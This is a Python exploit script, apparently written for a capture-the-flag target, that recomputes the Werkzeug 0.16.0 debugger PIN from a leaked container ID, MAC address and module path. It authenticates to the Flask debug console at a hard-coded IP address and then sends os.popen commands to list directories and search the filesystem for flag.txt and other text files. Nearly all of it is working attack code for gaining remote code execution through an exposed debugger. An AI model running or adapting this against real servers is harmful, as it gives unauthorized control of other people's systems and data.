"""Correct Werkzeug 0.16.0 PIN calculation."""
import hashlib
import requests
from itertools import chain

T = "http://10.82.168.213"
SECRET = "OTPd3q771BpLTWzmQWYb"

# Werkzeug 0.16 get_machine_id():
# 1. Reads /proc/self/cgroup first line
# 2. .partition("/docker/")[2] -> container ID
# 3. If found, returns container ID immediately (skips machine-id/boot-id!)
# First cgroup line: "12:cpu,cpuacct:/docker/77c09e05c4a9..."
machine_id = "77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca"

# MAC
mac_int = 2485378088962

# probably_public_bits:
# username: could be None (KeyError in Docker) or "root"
# modname: "flask.app"
# appname: "Flask"
# mod_file: "/usr/local/lib/python3.10/site-packages/flask/app.py"
mod_path = "/usr/local/lib/python3.10/site-packages/flask/app.py"

# Try both None and "root" for username
for username in [None, "root"]:
    probably_public_bits = [
        username,
        "flask.app",
        "Flask",
        mod_path,
    ]
    private_bits = [str(mac_int), machine_id]

    h = hashlib.md5()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    h.update(b"cookiesalt")

    cookie_name = "__wzd" + h.hexdigest()[:20]

    h.update(b"pinsalt")
    num = ("%09d" % int(h.hexdigest(), 16))[:9]

    # Format: 9 digits -> XXX-XXX-XXX (group of 3)
    pin = "-".join(num[x:x+3] for x in range(0, 9, 3))

    print(f"username={username}: PIN={pin}, cookie={cookie_name}")

    # Test this PIN
    auth_url = f"{T}?__debugger__=yes&cmd=pinauth&pin={pin}&s={SECRET}"
    r = requests.get(auth_url, timeout=8)
    print(f"  Auth response: {r.text}")

    if "true" in r.text.lower():
        print(f"\n>>> SUCCESS! PIN = {pin} <<<\n")

        # Find all .txt files
        cmds = [
            "import os; print(os.listdir('/usr/src/app'))",
            "import os; print([os.path.join(r,f) for r,d,files in os.walk('/usr/src') for f in files if f.endswith('.txt')])",
            "__import__('os').popen('find / -name flag.txt 2>/dev/null').read()",
            "__import__('os').popen('find / -name *.txt 2>/dev/null').read()",
        ]
        for cmd in cmds:
            exec_url = f"{T}?__debugger__=yes&cmd={requests.utils.quote(cmd)}&frm=0&s={SECRET}"
            r2 = requests.get(exec_url, timeout=10)
            import re
            clean = re.sub(r'<[^>]+>', '', r2.text).strip()
            lines = [l.strip() for l in clean.split('\n') if l.strip()]
            print(f"\n>>> {cmd}")
            for line in lines[:20]:
                print(f"  {line}")
        break
